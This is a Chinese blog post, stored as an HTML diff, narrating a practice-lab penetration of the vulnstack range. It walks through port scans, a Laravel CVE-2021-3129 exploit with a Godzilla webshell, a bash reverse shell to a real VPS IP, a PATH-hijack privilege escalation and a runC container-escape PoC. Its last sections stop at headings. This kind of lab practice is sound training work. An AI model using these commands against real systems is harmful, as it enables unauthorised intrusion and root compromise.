@@ -1,0 +1,233 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>域控靶场练习 | 墨水彩笔</title><meta name="author" content="墨水彩笔"><meta name="copyright" content="墨水彩笔"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="环境配置本次靶场练习用的靶场链接 1http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;9&#x2F;  writeup地址 1https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;network&#x2F;264560.html  靶场的拓扑图  靶场实">
+<meta property="og:type" content="article">
+<meta property="og:title" content="域控靶场练习">
+<meta property="og:url" content="http://example.com/2023/02/22/%E5%9F%9F%E6%8E%A7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/index.html">
+<meta property="og:site_name" content="墨水彩笔">
+<meta property="og:description" content="环境配置本次靶场练习用的靶场链接 1http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;9&#x2F;  writeup地址 1https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;network&#x2F;264560.html  靶场的拓扑图  靶场实">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2023-02-22T05:23:50.000Z">
+<meta property="article:modified_time" content="2023-02-23T11:14:02.356Z">
+<meta property="article:author" content="墨水彩笔">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/02/22/%E5%9F%9F%E6%8E%A7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  hexoversion: '5.2.0',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isSidebar: true,
+  postUpdate: '2023-02-23 19:14:02'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {
+  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }
+})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">74</div></a></div></div></div><hr/></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98"><span class="toc-number">2.</span> <span class="toc-text">靶场实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.0.1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Goby"><span class="toc-number">2.0.1.0.1.</span> <span class="toc-text">Goby</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#nmap"><span class="toc-number">2.0.1.0.2.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#fscan"><span class="toc-number">2.0.1.0.3.</span> <span class="toc-text">fscan</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%9F%A5%E8%AF%A2"><span class="toc-number">2.0.1.0.4.</span> <span class="toc-text">漏洞查询</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#docker%E9%80%83%E9%80%B8"><span class="toc-number">2.0.2.</span> <span class="toc-text">docker逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Docker-runC%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8"><span class="toc-number">2.0.3.</span> <span class="toc-text">利用Docker runC漏洞逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker-%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E9%80%83%E9%80%B8"><span class="toc-number">2.0.4.</span> <span class="toc-text">Docker 特权模式逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83Getshell"><span class="toc-number">2.0.5.</span> <span class="toc-text">Redis未授权Getshell</span></a></li></ol></li></ol></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">墨水彩笔</a></span><span id="menus"><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">域控靶场练习</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-02-22T05:23:50.000Z" title="Created 2023-02-22 13:23:50">2023-02-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-02-23T11:14:02.356Z" title="Updated 2023-02-23 19:14:02">2023-02-23</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>本次靶场练习用的靶场链接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;9&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>writeup地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;network&#x2F;264560.html</span><br></pre></td></tr></table></figure>
+
+<p>靶场的拓扑图</p>
+<p><img src="https://image.3001.net/images/20210226/1614336174_6038d0ae97a56a0f1e287.png!small" alt="20210226161713.png"></p>
+<h1 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a>靶场实战</h1><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>首先进行信息收集</p>
+<h5 id="Goby"><a href="#Goby" class="headerlink" title="Goby"></a>Goby</h5><p>通过Goby进行扫描发现存在22、80、81三个端口</p>
+<img src="/2023/02/22/%E5%9F%9F%E6%8E%A7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/02/22/%E5%9F%9F%E6%8E%A7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20230222133110578.png" class title="image-20230222133110578">
+
+<h5 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h5><p>在信息收集的时候要多利用几个工具，使用Kali中的nmap扫描</p>
+<img src="/2023/02/22/%E5%9F%9F%E6%8E%A7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/02/22/%E5%9F%9F%E6%8E%A7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20230222133158275.png" class title="image-20230222133158275">
+
+<p>发现存在22、25、80、81、110五个端口</p>
+<h5 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h5><p>使用fscan扫描，发现开放三个端口22、80、81</p>
+<img src="/2023/02/22/%E5%9F%9F%E6%8E%A7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/02/22/%E5%9F%9F%E6%8E%A7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20230222134512693.png" class title="image-20230222134512693">
+
+<p>接下来查看80和81端口</p>
+<p>发现80端口无法访问</p>
+<img src="/2023/02/22/%E5%9F%9F%E6%8E%A7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/02/22/%E5%9F%9F%E6%8E%A7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20230222134605921.png" class title="image-20230222134605921">
+
+<p>81端口访问如下</p>
+<img src="/2023/02/22/%E5%9F%9F%E6%8E%A7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/02/22/%E5%9F%9F%E6%8E%A7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20230222134642166.png" class title="image-20230222134642166">
+
+<p>查看对应版本在网上是否有day</p>
+<h5 id="漏洞查询"><a href="#漏洞查询" class="headerlink" title="漏洞查询"></a>漏洞查询</h5><p>针对Laravel v8.29.0 (PHP v7.4.14)进行漏洞搜索</p>
+<p>发现漏洞编号[CVE-2021-3129]</p>
+<p>找到一个github项目可以一键getshell后链接冰蝎</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;SecPros-Team&#x2F;laravel-CVE-2021-3129-EXP</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/02/22/%E5%9F%9F%E6%8E%A7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/02/22/%E5%9F%9F%E6%8E%A7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20230222145900707.png" class title="image-20230222145900707">
+
+<p>这时候掏出哥斯拉即Godzilla，但这里要注意Godzilla的版本要小于3.0</p>
+<p>我们选择2.96</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;BeichenDream&#x2F;Godzilla&#x2F;releases&#x2F;tag&#x2F;v2.96-godzilla</span><br></pre></td></tr></table></figure>
+
+<p>配置的时候注意修改有效载荷</p>
+<img src="/2023/02/22/%E5%9F%9F%E6%8E%A7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/02/22/%E5%9F%9F%E6%8E%A7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20230222151315778.png" class title="image-20230222151315778">
+
+<p>进入命令执行</p>
+<img src="/2023/02/22/%E5%9F%9F%E6%8E%A7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/02/22/%E5%9F%9F%E6%8E%A7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20230222151338641.png" class title="image-20230222151338641">
+
+<p>发现权限很低那么要提权</p>
+<h3 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h3><p>我们利用哥斯拉命令执行</p>
+<p>使用命令查看所处是否在docker里面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;self&#x2F;cgroup</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/02/22/%E5%9F%9F%E6%8E%A7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/02/22/%E5%9F%9F%E6%8E%A7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20230222155159700.png" class title="image-20230222155159700">
+
+<p>发现处于docker内，需要逃逸提权</p>
+<p>使用find命令来搜索具有SUID或4000权限的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/02/22/%E5%9F%9F%E6%8E%A7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/02/22/%E5%9F%9F%E6%8E%A7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20230222155249967.png" class title="image-20230222155249967">
+
+<p>发现可疑文件，使用哥斯拉的命令执行发现无法进行目录的变更即无法cd，使用反弹shell给vps操作</p>
+<p>输入命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;vps的ip&#x2F;9999 0&gt;&amp;1&quot;</span><br><span class="line">43.143.224.232</span><br><span class="line">bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;43.143.224.232&#x2F;9999 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+
+<p>vps上使用监听命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 9999但报错</span><br><span class="line">发现需要更换为</span><br><span class="line">nc -lvnp 9999成功反弹</span><br></pre></td></tr></table></figure>
+
+<p>执行shell文件</p>
+<img src="/2023/02/22/%E5%9F%9F%E6%8E%A7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/02/22/%E5%9F%9F%E6%8E%A7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20230222160000161.png" class title="image-20230222160000161">
+
+<p>看到shell文件执行了ps命令，并且未使用绝对路径，所以我们可以尝试更改$PATH来执行我们的恶意程序，从而获得目标主机的高权限shell。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">echo &quot;&#x2F;bin&#x2F;bash&quot; &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH </span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH # 将&#x2F;tmp添加到环境变量中，并且先加载执行&#x2F;tmp里的程序</span><br><span class="line">cd &#x2F;home&#x2F;jobs</span><br><span class="line">.&#x2F;shell</span><br><span class="line"># 然后就获得了root权限，可以执行命令了</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/02/22/%E5%9F%9F%E6%8E%A7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/02/22/%E5%9F%9F%E6%8E%A7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20230222160352582.png" class title="image-20230222160352582">
+
+<h3 id="利用Docker-runC漏洞逃逸"><a href="#利用Docker-runC漏洞逃逸" class="headerlink" title="利用Docker runC漏洞逃逸"></a>利用Docker runC漏洞逃逸</h3><p>攻击脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Frichetten&#x2F;CVE-2019-5736-PoC</span><br></pre></td></tr></table></figure>
+
+<p>修改文件的内容</p>
+<img src="/2023/02/22/%E5%9F%9F%E6%8E%A7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/02/22/%E5%9F%9F%E6%8E%A7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20230222165739625.png" class title="image-20230222165739625">
+
+<p>执行命令编译生成payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CGO_ENABLED&#x3D;0 GOOS&#x3D;linux GOARCH&#x3D;amd64 go build main.go</span><br></pre></td></tr></table></figure>
+
+<p>将生成的利用程序main上传到目标主机并赋予权限</p>
+<p>接着在攻击机上面启动nc监听</p>
+<p>接着在目标docker上面运行main文件</p>
+<p>此时，只需等待目标机管理员重启该docker容器，payload就会触发。</p>
+<h3 id="Docker-特权模式逃逸"><a href="#Docker-特权模式逃逸" class="headerlink" title="Docker 特权模式逃逸"></a>Docker 特权模式逃逸</h3><p>特权模式于版本0.6时被引入Docker，允许容器内的root拥有外部物理机root权限，而此前容器内root用户仅拥有外部物理机普通用户权限。</p>
+<p>使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker run —privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。</p>
+<p>当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。</p>
+<p>首先我们现在docker中新建一个/hack目录用来挂在文件：</p>
+<h3 id="Redis未授权Getshell"><a href="#Redis未授权Getshell" class="headerlink" title="Redis未授权Getshell"></a>Redis未授权Getshell</h3></div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">墨水彩笔</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2023/02/22/%E5%9F%9F%E6%8E%A7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">http://example.com/2023/02/22/%E5%9F%9F%E6%8E%A7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/02/23/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-shiro550/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Shiro反序列化-shiro550</div></div></a></div><div class="next-post pull-right"><a href="/2023/02/18/Java%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Java深入学习（持续更新）</div></div></a></div></nav></article></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 墨水彩笔</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
